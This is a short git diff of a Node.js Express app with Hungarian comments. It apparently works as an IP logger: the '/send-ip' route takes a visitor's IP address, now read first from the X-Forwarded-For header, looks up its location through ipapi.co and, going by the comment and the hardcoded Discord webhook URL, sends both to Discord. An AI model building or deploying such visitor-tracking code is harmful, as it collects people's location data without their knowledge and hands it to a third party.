@@ -9,7 +9,9 @@ const webhookUrl = 'https://discord.com/api/webhooks/1163410175395373107/Tc5X6Nd
 // IP cím és hely információ küldése a Discordra
 app.get('/send-ip', (req, res) => {
     // A látogató IP címének lekérése
-    const userIp = req.ip || req.connection.remoteAddress;
+    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
+
+    console.log('User IP: ', userIp); // Ellenőrizzük, hogy helyes IP-t kapunk-e
 
     // IP cím lekérdezése az ipapi API segítségével
     fetch(`https://ipapi.co/${userIp}/json/`)
